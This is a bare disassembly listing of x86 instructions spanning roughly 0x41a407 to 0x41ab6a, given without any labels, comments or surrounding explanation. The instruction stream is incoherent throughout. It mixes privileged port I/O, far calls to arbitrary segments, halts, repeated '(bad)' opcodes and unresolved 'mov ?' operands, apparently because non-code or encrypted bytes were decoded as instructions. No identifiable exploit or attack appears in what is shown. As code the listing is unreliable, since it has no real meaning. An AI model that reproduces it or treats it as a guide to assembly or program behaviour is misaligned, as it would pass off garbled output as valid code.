  41a407:	mov    esp,0xe312460e
  41a40c:	mov    edi,0xe23594eb
  41a411:	and    DWORD PTR [esi+0x6cfe9a8a],edi
  41a417:	xor    bl,BYTE PTR [edi-0xb59fdf6]
  41a41d:	add    dh,dl
  41a41f:	leave  
  41a420:	pop    ebx
  41a421:	sbb    DWORD PTR [ebx-0x3f],ecx
  41a424:	stos   DWORD PTR es:[edi],eax
  41a425:	jne    0x41a492
  41a427:	push   ebx
  41a428:	jg     0x41a43d
  41a42a:	mov    al,ds:0x3cf26939
  41a42f:	outs   dx,DWORD PTR ds:[esi]
  41a430:	cmp    dl,al
  41a432:	je     0x41a3c0
  41a434:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a435:	ins    BYTE PTR es:[edi],dx
  41a436:	ja     0x41a3bc
  41a438:	lock out dx,eax
  41a43a:	dec    eax
  41a43b:	fldcw  WORD PTR [eax]
  41a43d:	jb     0x41a433
  41a43f:	arpl   WORD PTR [edi+0x71],si
  41a442:	dec    ebp
  41a443:	jo     0x41a4b5
  41a445:	adc    ecx,esi
  41a447:	mov    dl,BYTE PTR [edi-0x44705124]
  41a44d:	(bad)  
  41a44e:	push   edx
  41a44f:	nop
  41a450:	sbb    BYTE PTR [eax-0x5cf857d9],ch
  41a456:	cmc    
  41a457:	mov    eax,0xa0bb4dbc
  41a45c:	jae    0x41a451
  41a45e:	fs ds mov edx,0xcfb98535
  41a465:	jmp    0x840619bf
  41a46a:	jb     0x41a42d
  41a46c:	xlat   BYTE PTR ds:[ebx]
  41a46d:	test   eax,0x5f4b468b
  41a472:	dec    esi
  41a473:	es mov ebx,0xeae2e0c4
  41a479:	mov    ds:0x88c4e93a,al
  41a47e:	addr16 in eax,dx
  41a480:	fbld   TBYTE PTR [ebx-0x1f]
  41a483:	jmp    0x41a456
  41a485:	ins    BYTE PTR es:[edi],dx
  41a486:	inc    edx
  41a487:	call   0x405c:0x8ba1f6c3
  41a48e:	or     BYTE PTR [edi],cl
  41a490:	pusha  
  41a491:	loope  0x41a4e8
  41a493:	mov    ch,0x30
  41a495:	rol    BYTE PTR [ebp-0xf09abf9],0x28
  41a49c:	std    
  41a49d:	fucom  st(2)
  41a49f:	push   0xe3389a1
  41a4a4:	rcr    BYTE PTR fs:[ecx-0x78],cl
  41a4a8:	lahf   
  41a4a9:	ret    
  41a4aa:	mov    cl,BYTE PTR [ebx]
  41a4ac:	jle    0x41a4a6
  41a4ae:	inc    ebx
  41a4af:	or     BYTE PTR [ecx+0x35f1095],bl
  41a4b5:	inc    edi
  41a4b6:	not    BYTE PTR [ebp+0x9]
  41a4b9:	call   0x36ee897
  41a4be:	ds je  0x41a4b3
  41a4c1:	inc    eax
  41a4c2:	jecxz  0x41a4a8
  41a4c4:	lods   eax,DWORD PTR ds:[esi]
  41a4c5:	mov    edi,0x80ccb1e7
  41a4ca:	add    eax,0x28405579
  41a4cf:	icebp  
  41a4d0:	retf   
  41a4d1:	xor    eax,0x8407ba09
  41a4d6:	jae    0x41a52b
  41a4d8:	jns    0x41a51c
  41a4da:	dec    ebx
  41a4db:	lock dec eax
  41a4dd:	pop    eax
  41a4de:	shl    BYTE PTR [edi+0x6c20e5dc],0x45
  41a4e5:	add    DWORD PTR [esi+0x38],edx
  41a4e8:	ret    
  41a4e9:	call   0x114a:0x15ce2211
  41a4f0:	push   ebp
  41a4f1:	sbb    al,0x44
  41a4f3:	inc    esp
  41a4f4:	sahf   
  41a4f5:	rcl    BYTE PTR [eax],1
  41a4f7:	aaa    
  41a4f8:	out    0x28,eax
  41a4fa:	les    ebx,FWORD PTR [ebx+0x5c]
  41a4fd:	dec    esp
  41a4fe:	mul    ch
  41a500:	je     0x41a49e
  41a502:	pop    ebp
  41a503:	sub    BYTE PTR [esi-0x6c],bl
  41a506:	mov    ah,0x5b
  41a508:	pop    ds
  41a509:	mov    al,ds:0x7bdd78f6
  41a50e:	dec    esi
  41a50f:	add    ebx,DWORD PTR [edx+edx*8]
  41a512:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a513:	sub    al,0x92
  41a515:	jbe    0x41a55b
  41a517:	scas   al,BYTE PTR es:[edi]
  41a518:	inc    ebx
  41a519:	xlat   BYTE PTR ds:[ebx]
  41a51a:	push   0x5ae9fb06
  41a51f:	push   ss
  41a520:	xor    edi,DWORD PTR [eax]
  41a522:	imul   ebx,ebx,0x70
  41a525:	shr    BYTE PTR [esi-0x22],0x4a
  41a529:	sub    al,0xfa
  41a52b:	(bad)  
  41a52c:	outs   dx,DWORD PTR ds:[esi]
  41a52d:	xchg   DWORD PTR [eax],esp
  41a52f:	test   ebp,0x3b4bd93f
  41a535:	jb     0x41a4c9
  41a537:	sub    bl,BYTE PTR [esi-0x4d6e97f7]
  41a53d:	das    
  41a53e:	aaa    
  41a53f:	jno    0x41a59c
  41a541:	and    BYTE PTR [ecx-0x18],cl
  41a544:	fcomp  st(1)
  41a546:	xchg   ecx,eax
  41a547:	cmp    ebp,DWORD PTR [edx]
  41a549:	retf   
  41a54a:	push   edi
  41a54b:	cdq    
  41a54c:	lock cmp DWORD PTR ds:0x9a2563cd,edx
  41a553:	add    esi,edx
  41a555:	push   esi
  41a556:	pop    esi
  41a557:	adc    BYTE PTR [ebp+0x3fad1e57],bl
  41a55d:	ins    DWORD PTR es:[edi],dx
  41a55e:	in     eax,0xd6
  41a560:	xlat   BYTE PTR ds:[ebx]
  41a561:	xor    al,0xb6
  41a563:	and    DWORD PTR [ecx],esp
  41a565:	cs dec ebp
  41a567:	sub    edi,edi
  41a569:	sbb    eax,0xc69298e5
  41a56e:	xchg   DWORD PTR [edx+0x26],esp
  41a571:	push   0xffffffad
  41a573:	(bad)  
  41a574:	aam    0xd1
  41a576:	xchg   esp,eax
  41a577:	cmp    dl,cl
  41a579:	mov    ebx,0x2dcb38c2
  41a57e:	test   eax,esp
  41a580:	call   DWORD PTR [edi]
  41a582:	sub    bh,bh
  41a584:	ss mov ebx,ebx
  41a587:	sub    ebx,esi
  41a589:	lds    ebx,FWORD PTR [edx-0x234484a3]
  41a58f:	retf   
  41a590:	pop    ebp
  41a591:	gs push edx
  41a593:	nop
  41a594:	call   0x3607:0x1df36e56
  41a59b:	daa    
  41a59c:	pop    ebp
  41a59d:	ss and ch,cl
  41a5a0:	adc    ah,dl
  41a5a2:	sahf   
  41a5a3:	push   0x570d0aa8
  41a5a8:	outs   dx,DWORD PTR ds:[esi]
  41a5a9:	ret    
  41a5aa:	adc    eax,DWORD PTR [ecx+0x4e]
  41a5ad:	lods   eax,DWORD PTR ds:[esi]
  41a5ae:	mov    al,ds:0x79e645ab
  41a5b3:	sub    DWORD PTR [esi+0xdf72a96],esp
  41a5b9:	in     al,dx
  41a5ba:	or     al,bh
  41a5bc:	jmp    0x9ed1:0x7bb56d64
  41a5c3:	add    DWORD PTR [edi+0x64],ebx
  41a5c6:	es jnp 0x41a560
  41a5c9:	pop    ebx
  41a5ca:	stc    
  41a5cb:	push   es
  41a5cc:	xchg   edx,eax
  41a5cd:	or     BYTE PTR [esi+0x4],bh
  41a5d0:	dec    al
  41a5d2:	sbb    al,0xca
  41a5d4:	nop
  41a5d5:	push   cs
  41a5d6:	add    al,0x12
  41a5d8:	xchg   esp,eax
  41a5d9:	test   DWORD PTR [ebp+0x1d],eax
  41a5dc:	out    dx,al
  41a5dd:	es je  0x41a64d
  41a5e0:	call   0x7a1e:0xa584914e
  41a5e7:	push   edx
  41a5e8:	into   
  41a5e9:	inc    eax
  41a5ea:	pusha  
  41a5eb:	dec    edx
  41a5ec:	xor    al,ah
  41a5ee:	mov    edi,DWORD PTR [esi+ecx*4]
  41a5f1:	or     BYTE PTR [ecx+0x71],dl
  41a5f4:	fldenv [esp+ecx*4-0x15]
  41a5f8:	dec    esi
  41a5f9:	inc    eax
  41a5fa:	stos   DWORD PTR es:[edi],eax
  41a5fb:	sahf   
  41a5fc:	sbb    al,0xea
  41a5fe:	daa    
  41a5ff:	mov    ds:0x8cbeef95,eax
  41a604:	popf   
  41a605:	popa   
  41a606:	js     0x41a594
  41a608:	lahf   
  41a609:	ins    DWORD PTR es:[edi],dx
  41a60a:	ins    BYTE PTR es:[edi],dx
  41a60b:	loopne 0x41a627
  41a60d:	sbb    eax,0x396b516d
  41a612:	dec    eax
  41a613:	add    BYTE PTR [edx+0x2e94fc90],dl
  41a619:	call   0xa5a7ef9b
  41a61e:	dec    ecx
  41a61f:	or     al,0x80
  41a621:	into   
  41a622:	sub    BYTE PTR [esi+0x1a],0xb7
  41a626:	fs cdq 
  41a628:	sbb    al,0xab
  41a62a:	int    0x53
  41a62c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a62d:	repnz dec ebp
  41a62f:	mov    ebx,0x6d2148f3
  41a634:	xor    edx,DWORD PTR [ebp-0xc425310]
  41a63a:	clc    
  41a63b:	mov    al,ds:0x39d4b33b
  41a640:	pushf  
  41a641:	sub    edx,DWORD PTR ds:0x3e0cb16d
  41a647:	(bad)  
  41a648:	jne    0x41a640
  41a64a:	retf   0xfc1a
  41a64d:	sbb    eax,0x89526450
  41a652:	jbe    0x41a6b7
  41a654:	in     al,dx
  41a655:	push   ss
  41a656:	fsub   DWORD PTR [ebx]
  41a658:	add    DWORD PTR [esi+ebp*8+0x78],esi
  41a65c:	and    ah,ah
  41a65e:	inc    ebx
  41a65f:	inc    edx
  41a660:	retf   
  41a661:	in     al,0x2c
  41a663:	into   
  41a664:	aaa    
  41a665:	mov    eax,0x56c9a487
  41a66a:	jl     0x41a6c6
  41a66c:	cmp    al,0x6f
  41a66e:	or     edi,DWORD PTR [di-0x6df2]
  41a673:	xchg   DWORD PTR [ecx+0x34],ecx
  41a676:	or     bl,BYTE PTR [eax-0x23]
  41a679:	sub    eax,0xac44a1fd
  41a67e:	mov    DWORD PTR [esi+0x2],ebp
  41a681:	sbb    DWORD PTR [ebx+0x5a],esi
  41a684:	sbb    ebp,ebp
  41a686:	and    al,0x30
  41a688:	xchg   DWORD PTR [ebx],eax
  41a68a:	ret    
  41a68b:	das    
  41a68c:	sub    ebx,DWORD PTR [ebx+0xc49f874]
  41a692:	(bad)  
  41a693:	mov    bh,0x43
  41a695:	je     0x41a6cc
  41a697:	cmp    ebx,DWORD PTR [esi-0x72e9f349]
  41a69d:	arpl   WORD PTR [eax],cx
  41a69f:	frstor [edi+0x24b072b0]
  41a6a5:	cld    
  41a6a6:	sub    cl,BYTE PTR ds:0x6f9521cc
  41a6ac:	loope  0x41a649
  41a6ae:	inc    eax
  41a6af:	ja     0x41a6a1
  41a6b1:	div    DWORD PTR [esi-0x4b54b262]
  41a6b7:	mov    es:0xbd018f4f,eax
  41a6bd:	xor    edi,DWORD PTR [eax-0x17]
  41a6c0:	fmul   DWORD PTR [edx]
  41a6c2:	sub    ah,dh
  41a6c4:	cwde   
  41a6c5:	mov    bl,0xf3
  41a6c7:	test   al,0xd
  41a6c9:	xor    cl,BYTE PTR [edi-0x5fd1d8e8]
  41a6cf:	int3   
  41a6d0:	in     al,dx
  41a6d1:	test   BYTE PTR [edx+0x4c52ae9b],ah
  41a6d7:	mov    ds:0x9ee80031,al
  41a6dc:	sbb    al,0x66
  41a6de:	mov    ds:0x1b2ee417,al
  41a6e3:	add    al,0x4b
  41a6e5:	xchg   edx,eax
  41a6e6:	(bad)  
  41a6e7:	in     al,dx
  41a6e8:	jle    0x41a687
  41a6ea:	push   ebx
  41a6eb:	jmp    0x78df:0x259d33ae
  41a6f2:	cmp    ebp,DWORD PTR [eax+0x58]
  41a6f5:	jns    0x41a731
  41a6f7:	jl     0x41a708
  41a6f9:	push   ebx
  41a6fa:	ficomp DWORD PTR [ecx+edi*4+0x53]
  41a6fe:	adc    ch,BYTE PTR [ebp-0x57b7f96f]
  41a704:	cmp    al,0x1a
  41a706:	sbb    DWORD PTR [eax],0xe0230f12
  41a70c:	in     al,dx
  41a70d:	leave  
  41a70e:	jp     0x41a718
  41a710:	and    BYTE PTR [ebx],ah
  41a712:	lahf   
  41a713:	mov    ds:0xac2e2cae,eax
  41a718:	scas   al,BYTE PTR es:[edi]
  41a719:	and    BYTE PTR ds:0xbfefee6d,bl
  41a71f:	das    
  41a720:	adc    eax,0x21e66b31
  41a725:	sub    edx,esp
  41a727:	inc    eax
  41a728:	les    ecx,FWORD PTR [edx-0x75]
  41a72b:	arpl   ax,cx
  41a72d:	or     ebp,DWORD PTR [eax-0x57a2f376]
  41a733:	arpl   WORD PTR [ecx],ax
  41a735:	pop    ecx
  41a736:	xchg   ebx,eax
  41a737:	adc    al,0x64
  41a739:	mov    ch,0x4f
  41a73b:	test   al,0x94
  41a73d:	leave  
  41a73e:	jg     0x41a749
  41a740:	mov    dl,0x48
  41a742:	jmp    0x41a6e0
  41a744:	cwde   
  41a745:	cmp    DWORD PTR [ebx+edx*1+0x13389c06],ebp
  41a74c:	pushf  
  41a74d:	fld    TBYTE PTR [esi-0x2f]
  41a750:	call   0x9de6c556
  41a755:	xlat   BYTE PTR ds:[ebx]
  41a756:	xor    ch,BYTE PTR [edx-0x55e3ae83]
  41a75c:	retf   0xd338
  41a75f:	push   0xa071243d
  41a764:	xchg   edi,eax
  41a765:	pusha  
  41a766:	ret    
  41a767:	cld    
  41a768:	sbb    al,0x4a
  41a76a:	outs   dx,BYTE PTR ds:[esi]
  41a76b:	ret    
  41a76c:	sbb    ecx,DWORD PTR [edx+0x28]
  41a76f:	mul    BYTE PTR [ebx+edx*8]
  41a772:	cmp    DWORD PTR [esp+ebx*1+0x1a],esp
  41a776:	hlt    
  41a777:	push   edx
  41a778:	cdq    
  41a779:	ret    0x8be4
  41a77c:	jp     0x41a796
  41a77e:	mov    BYTE PTR ds:0x208e0246,cl
  41a784:	shl    ecx,1
  41a786:	daa    
  41a787:	mov    al,ds:0x6d5d9673
  41a78c:	xor    DWORD PTR [ebp-0x63eefd28],ecx
  41a792:	fild   DWORD PTR [ecx]
  41a794:	hlt    
  41a795:	addr16 push 0x1a
  41a798:	mov    edi,0x11d01b9a
  41a79d:	add    eax,0x6c6b9353
  41a7a2:	and    ebp,DWORD PTR [ebp-0x664c2d78]
  41a7a8:	fcmovu st,st(6)
  41a7aa:	ja     0x41a7e8
  41a7ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ad:	sbb    edi,DWORD PTR [eax+0xf80239d]
  41a7b3:	jno    0x41a7c1
  41a7b5:	mov    DWORD PTR [edi-0x49],edx
  41a7b8:	in     al,0x1b
  41a7ba:	out    0x1,eax
  41a7bc:	stc    
  41a7bd:	out    0x16,al
  41a7bf:	pop    ebp
  41a7c0:	arpl   WORD PTR [edx-0x6a],dx
  41a7c3:	out    dx,eax
  41a7c4:	lock push DWORD PTR [ebp+0x4d]
  41a7c8:	pop    ebx
  41a7c9:	gs fcomp st(7)
  41a7cc:	push   ebp
  41a7cd:	or     eax,DWORD PTR [edi+eiz*8+0x3]
  41a7d1:	mov    dh,0x18
  41a7d3:	mov    al,ds:0xa396258a
  41a7d8:	sbb    cl,BYTE PTR [edx-0x2a]
  41a7db:	mov    edx,0x9dca45ac
  41a7e0:	out    0x3e,al
  41a7e2:	ffreep st(4)
  41a7e4:	(bad)
  41a7e7:	inc    ebx
  41a7e8:	ins    DWORD PTR es:[edi],dx
  41a7e9:	fs retf 
  41a7eb:	push   ds
  41a7ec:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ee:	sbb    ebp,eax
  41a7f0:	stos   BYTE PTR es:[edi],al
  41a7f1:	mov    al,0xf2
  41a7f3:	dec    ebx
  41a7f4:	lahf   
  41a7f5:	and    BYTE PTR [eax],0x20
  41a7f8:	and    al,0x48
  41a7fa:	adc    DWORD PTR cs:[edi+0xb0fe25d],esi
  41a801:	xchg   esi,eax
  41a802:	mov    ecx,0x5c001caa
  41a807:	push   es
  41a808:	outs   dx,DWORD PTR ds:[esi]
  41a809:	and    cl,BYTE PTR [ebp-0x67]
  41a80c:	loop   0x41a87f
  41a80e:	xchg   BYTE PTR [eax],dl
  41a810:	inc    ebp
  41a811:	or     al,0x96
  41a813:	add    eax,0x4faa3fda
  41a818:	(bad)  
  41a819:	and    cl,BYTE PTR [esi+0x72dd7edd]
  41a81f:	pusha  
  41a820:	pop    ss
  41a821:	jo     0x41a889
  41a823:	xchg   BYTE PTR [ecx],ah
  41a825:	call   0xddfff2a9
  41a82a:	std    
  41a82b:	adc    BYTE PTR [edx+0x7348fccd],0x7b
  41a832:	outs   dx,DWORD PTR ds:[esi]
  41a833:	call   0x1dd9:0x305004c6
  41a83a:	jmp    0x41a83e
  41a83c:	mov    edi,0xa6bc37c3
  41a841:	cmp    ebx,ebx
  41a843:	xor    BYTE PTR [ebx+ebx*1],al
  41a846:	bound  ecx,QWORD PTR [esi]
  41a848:	fsub   st(4),st
  41a84a:	retf   0x88ec
  41a84d:	test   DWORD PTR [bp+di+0x1669],eax
  41a852:	enter  0xc5ea,0xc2
  41a856:	pop    ss
  41a857:	or     dl,BYTE PTR [ebx+0x6f80de37]
  41a85d:	sbb    al,0x6c
  41a85f:	mov    esi,0x18b2b9c9
  41a864:	cmp    eax,esi
  41a866:	jp     0x41a8a2
  41a868:	and    al,0x21
  41a86a:	imul   ebx,DWORD PTR [edx+0x66],0xffffffb2
  41a86e:	sbb    DWORD PTR [ebp+0x7c],0x8a8e031
  41a875:	bound  eax,QWORD PTR [ecx]
  41a877:	test   eax,0xfaf69f07
  41a87c:	pop    eax
  41a87d:	cmp    ah,BYTE PTR [edx-0x6d9f519]
  41a883:	ret    0x797f
  41a886:	push   0x43
  41a888:	gs xchg edi,eax
  41a88a:	lea    edi,ds:0xd48b9cda
  41a890:	outs   dx,DWORD PTR ds:[esi]
  41a891:	ss popf 
  41a893:	push   ds
  41a894:	jb     0x41a81d
  41a896:	xchg   ebp,eax
  41a897:	aas    
  41a898:	popa   
  41a899:	jle    0x41a859
  41a89b:	cmp    eax,0x7dd5a2e6
  41a8a0:	scas   eax,DWORD PTR es:[edi]
  41a8a1:	jnp    0x41a8b2
  41a8a3:	mov    ebp,0x9f0be708
  41a8a8:	dec    esi
  41a8a9:	mov    bh,BYTE PTR [eax-0x297b0ac8]
  41a8af:	bound  esi,QWORD PTR [ebp+ebx*8+0x1]
  41a8b3:	int3   
  41a8b4:	or     dl,BYTE PTR [esi-0xbec6742]
  41a8ba:	inc    edx
  41a8bb:	arpl   si,bp
  41a8bd:	popa   
  41a8be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8bf:	pop    ebp
  41a8c0:	mov    ?,WORD PTR [edx]
  41a8c2:	mov    ch,0x54
  41a8c4:	jmp    0x6c18b451
  41a8c9:	cmp    bh,BYTE PTR [edx]
  41a8cb:	pop    eax
  41a8cc:	cmp    al,0xb0
  41a8ce:	jnp    0x41a8f2
  41a8d0:	mov    eax,ds:0x9537e337
  41a8d5:	sahf   
  41a8d6:	mov    ecx,0x15d7460f
  41a8db:	fs push 0xb3eee1ff
  41a8e1:	imul   ecx,DWORD PTR [esi],0x6e
  41a8e4:	pop    eax
  41a8e5:	xchg   edx,eax
  41a8e6:	add    edi,DWORD PTR [ebp+0x48]
  41a8e9:	push   esi
  41a8ea:	jo     0x41a960
  41a8ec:	ret    
  41a8ed:	xor    eax,0xba570685
  41a8f2:	push   ebp
  41a8f3:	and    esp,eax
  41a8f5:	jl     0x41a8ba
  41a8f7:	push   0xfbd659
  41a8fc:	sub    ecx,ebx
  41a8fe:	aaa    
  41a8ff:	pop    esi
  41a900:	dec    ecx
  41a901:	inc    esp
  41a902:	mov    ebx,0xfe26fe77
  41a907:	fwait
  41a908:	(bad)  
  41a909:	push   ds
  41a90a:	clc    
  41a90b:	fisub  DWORD PTR gs:[edx]
  41a90e:	leave  
  41a90f:	into   
  41a910:	pop    ss
  41a911:	xchg   esp,eax
  41a912:	jbe    0x41a895
  41a914:	sbb    ebx,esp
  41a916:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a918:	sub    eax,0xacad31e0
  41a91d:	mov    ah,0xa
  41a91f:	(bad)  
  41a920:	call   0x7db1596a
  41a925:	lods   al,BYTE PTR ds:[esi]
  41a926:	aam    0xa5
  41a928:	add    DWORD PTR [ecx+edi*2+0x40],0x20
  41a92d:	shr    DWORD PTR [esi+0x491cb06a],cl
  41a933:	and    esi,edx
  41a935:	or     BYTE PTR [edi+0x7e1cd7db],0x2c
  41a93c:	or     eax,0x190f363e
  41a941:	pop    ecx
  41a942:	xchg   dl,ch
  41a944:	sub    DWORD PTR [eax+edi*8-0x710c1f4],ebp
  41a94b:	retf   
  41a94c:	sar    BYTE PTR [edx],1
  41a94e:	jmp    FWORD PTR [ebp+0xc253bdd]
  41a954:	jb     0x41a9a1
  41a956:	icebp  
  41a957:	sbb    edi,0x34
  41a95a:	xchg   esi,eax
  41a95b:	mov    ebp,0x4eb7e9ab
  41a960:	or     BYTE PTR [ecx],dl
  41a962:	out    dx,eax
  41a963:	xchg   ebp,eax
  41a964:	jmp    0x2cf1ff60
  41a969:	lahf   
  41a96a:	push   ebp
  41a96b:	ror    BYTE PTR [esi-0x2e],1
  41a96e:	and    DWORD PTR [ecx+edi*1],esp
  41a971:	call   DWORD PTR [eax+0x25]
  41a974:	inc    esi
  41a975:	or     eax,0x72c75932
  41a97a:	mov    ebp,0x393999a1
  41a97f:	add    al,0x4f
  41a981:	ret    
  41a982:	mov    ds:0x53bbdf61,al
  41a987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a988:	add    dh,BYTE PTR [ebx]
  41a98a:	fsub   QWORD PTR [edi+ebp*8+0x487e5cf0]
  41a991:	fwait
  41a992:	ret    0xe3ed
  41a995:	sub    al,0x52
  41a997:	je     0x41a9c8
  41a999:	inc    eax
  41a99a:	pop    edx
  41a99b:	imul   edx,ebx,0xffffff8a
  41a99e:	test   eax,0x803350a
  41a9a3:	enter  0x5f86,0x5a
  41a9a7:	pop    esp
  41a9a8:	in     al,0xb7
  41a9aa:	add    al,0xcc
  41a9ac:	lods   eax,DWORD PTR ds:[esi]
  41a9ad:	imul   esp,DWORD PTR [edx],0x1f
  41a9b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a9b1:	(bad)  
  41a9b2:	in     al,dx
  41a9b3:	jp     0x41a9a4
  41a9b5:	inc    ecx
  41a9b6:	pop    esi
  41a9b7:	inc    edx
  41a9b8:	(bad)  
  41a9b9:	xchg   ebp,eax
  41a9ba:	jle    0x41a9ec
  41a9bc:	jbe    0x41a996
  41a9be:	sub    ecx,esi
  41a9c0:	call   0x6a63:0xaa6a6810
  41a9c7:	xchg   DWORD PTR [edi+0x1d],ebx
  41a9ca:	in     eax,0xc8
  41a9cc:	imul   ebp,DWORD PTR [eax],0x30
  41a9cf:	pop    ss
  41a9d0:	shl    DWORD PTR [esi+0x5d],0xf1
  41a9d4:	inc    ecx
  41a9d5:	fs loope 0x41aa48
  41a9d8:	fsub   QWORD PTR [ebp-0x76181050]
  41a9de:	mov    edi,0x4d0f9826
  41a9e3:	scas   al,BYTE PTR es:[edi]
  41a9e4:	ret    0x3a19
  41a9e7:	push   es
  41a9e8:	lock cli 
  41a9ea:	add    BYTE PTR [edi],dh
  41a9ec:	xchg   edx,eax
  41a9ed:	nop
  41a9ee:	call   0x547b:0x61705ddc
  41a9f5:	sar    DWORD PTR [edx],cl
  41a9f7:	and    edi,DWORD PTR [eax-0x4c]
  41a9fa:	clc    
  41a9fb:	inc    edi
  41a9fc:	inc    ecx
  41a9fd:	dec    edx
  41a9fe:	sar    BYTE PTR [ecx+0x6b],0xf0
  41aa02:	jmp    0xb33a:0xbf0cae8e
  41aa09:	push   ecx
  41aa0a:	mov    ch,0x3d
  41aa0c:	sbb    edi,DWORD PTR ds:0xcda78fca
  41aa12:	ss mov ebx,gs
  41aa15:	loopne 0x41a999
  41aa17:	sahf   
  41aa18:	lods   eax,DWORD PTR ds:[esi]
  41aa19:	jns    0x41a9cf
  41aa1b:	loope  0x41aa06
  41aa1d:	or     ecx,DWORD PTR [edi-0xc]
  41aa20:	iret   
  41aa21:	jae    0x41a9ca
  41aa23:	jl     0x41aaa4
  41aa25:	test   BYTE PTR [ebx+edx*1+0x10f230d1],bl
  41aa2c:	imul   edx,esi,0xffffff8c
  41aa2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa30:	mov    cl,0x26
  41aa32:	add    eax,0xc8435dbe
  41aa37:	xor    eax,0x52c90de
  41aa3c:	xchg   esi,eax
  41aa3d:	fs pusha 
  41aa3f:	jl     0x41aa7a
  41aa41:	int3   
  41aa42:	ror    DWORD PTR [ecx+0x62],0x5d
  41aa46:	mov    BYTE PTR ds:0x8223b6d4,cl
  41aa4c:	repz in eax,0xa9
  41aa4f:	and    al,BYTE PTR [ecx+0x40]
  41aa52:	cmp    eax,0xea87ff68
  41aa57:	shl    dl,0x8a
  41aa5a:	push   esp
  41aa5b:	pop    ebx
  41aa5c:	int3   
  41aa5d:	xchg   ebp,eax
  41aa5e:	(bad)  
  41aa60:	jle    0x41aaa0
  41aa62:	je     0x41a9e4
  41aa64:	mov    ecx,0x94610fec
  41aa69:	ds push edi
  41aa6b:	inc    ecx
  41aa6c:	mov    edx,0xffcf212e
  41aa71:	(bad)  
  41aa72:	fsubr  DWORD PTR [ecx+eiz*2]
  41aa75:	jo     0x41aaa1
  41aa77:	or     eax,0x90029f93
  41aa7c:	ins    BYTE PTR es:[edi],dx
  41aa7d:	les    ebp,FWORD PTR [edx-0x32]
  41aa80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa81:	lea    edi,[esi]
  41aa83:	adc    esi,DWORD PTR [ecx+0x3cbb65a3]
  41aa89:	push   ss
  41aa8a:	dec    esp
  41aa8b:	mov    edi,0xf888e9a1
  41aa90:	scas   al,BYTE PTR es:[edi]
  41aa91:	pop    ebx
  41aa92:	or     BYTE PTR [edi-0x15],ah
  41aa95:	das    
  41aa96:	repnz cmp eax,0x20e7a689
  41aa9c:	fs test al,0x27
  41aa9f:	ja     0x41aa54
  41aaa1:	retf   
  41aaa2:	aad    0x8a
  41aaa4:	xchg   esp,eax
  41aaa5:	jg     0x41aa42
  41aaa7:	inc    ecx
  41aaa8:	inc    esi
  41aaa9:	xlat   BYTE PTR ds:[ebx]
  41aaaa:	fwait
  41aaab:	xchg   BYTE PTR [ebp+0x3f],dl
  41aaae:	scas   al,BYTE PTR es:[edi]
  41aaaf:	stos   DWORD PTR es:[edi],eax
  41aab0:	fwait
  41aab1:	mov    ecx,0xa3a155e
  41aab6:	in     eax,dx
  41aab7:	xchg   ebp,eax
  41aab8:	loop   0x41aae2
  41aaba:	(bad)  
  41aabb:	in     eax,0x8c
  41aabd:	mov    ds:0x6e0530d0,al
  41aac2:	pop    ds
  41aac3:	jbe    0x41aab7
  41aac5:	rcr    bl,1
  41aac7:	mov    al,ds:0x6e2f749d
  41aacc:	xor    ecx,DWORD PTR [ebx+ebx*1-0x7e]
  41aad0:	imul   esi,DWORD PTR [ebx],0x54
  41aad3:	mov    ds:0x9f70fecd,al
  41aad8:	or     al,BYTE PTR [edx+0x1e]
  41aadb:	or     dl,al
  41aadd:	mov    fs,WORD PTR [edi]
  41aadf:	outs   dx,DWORD PTR ds:[esi]
  41aae0:	sub    al,ah
  41aae2:	push   edx
  41aae3:	and    bh,dl
  41aae5:	jg     0x41aa82
  41aae7:	dec    esi
  41aae8:	or     BYTE PTR [ecx-0x1e],0x2b
  41aaec:	call   0x5c361b26
  41aaf1:	imul   esi,edx,0x2627de81
  41aaf7:	shl    DWORD PTR [esp+ebp*1-0x53],1
  41aafb:	dec    esi
  41aafc:	mov    ?,WORD PTR [ecx+eax*2-0x64]
  41ab00:	cmp    DWORD PTR [ebp+0x7d],edi
  41ab03:	mov    ch,0x4
  41ab05:	or     DWORD PTR [edi+0x27be4104],0x19
  41ab0c:	cmc    
  41ab0d:	(bad)  
  41ab0f:	stos   BYTE PTR es:[edi],al
  41ab10:	pushaw 
  41ab12:	lea    ebx,[ebp-0x5e6fc1fa]
  41ab18:	in     al,dx
  41ab19:	mov    ds:0x57f49ecc,eax
  41ab1e:	cmp    eax,0xb593e45
  41ab23:	ret    
  41ab24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab25:	hlt    
  41ab26:	in     al,dx
  41ab27:	mov    bl,0x85
  41ab29:	cmp    al,0x14
  41ab2b:	cli    
  41ab2c:	faddp  st(5),st
  41ab2e:	(bad)  
  41ab2f:	pop    edi
  41ab30:	inc    ecx
  41ab31:	adc    al,0x9
  41ab33:	xchg   BYTE PTR [edx],bl
  41ab35:	mov    edi,ebx
  41ab37:	fnstcw WORD PTR [ebx]
  41ab39:	mov    edx,0x79986dfb
  41ab3e:	inc    ebp
  41ab3f:	pop    edx
  41ab40:	mov    ch,0x2d
  41ab42:	into   
  41ab43:	xchg   esi,esp
  41ab45:	dec    ebp
  41ab46:	xchg   ebx,eax
  41ab47:	ret    0x9f3
  41ab4a:	loop   0x41ab8d
  41ab4c:	aas    
  41ab4d:	scas   al,BYTE PTR es:[edi]
  41ab4e:	out    dx,eax
  41ab4f:	sub    al,bl
  41ab51:	int    0xb
  41ab53:	push   ecx
  41ab54:	mov    ah,0x9d
  41ab56:	add    dl,al
  41ab58:	jo     0x41ab9d
  41ab5a:	xchg   edx,eax
  41ab5b:	mov    eax,0x39ade816
  41ab60:	push   ebx
  41ab61:	pop    edx
  41ab62:	sub    BYTE PTR [edi],ah
  41ab64:	daa    
  41ab65:	cli    
  41ab66:	xchg   ebp,eax
  41ab67:	pop    edi
  41ab68:	lock inc ebp
  41ab6a:	enter  0x5780,0xdf
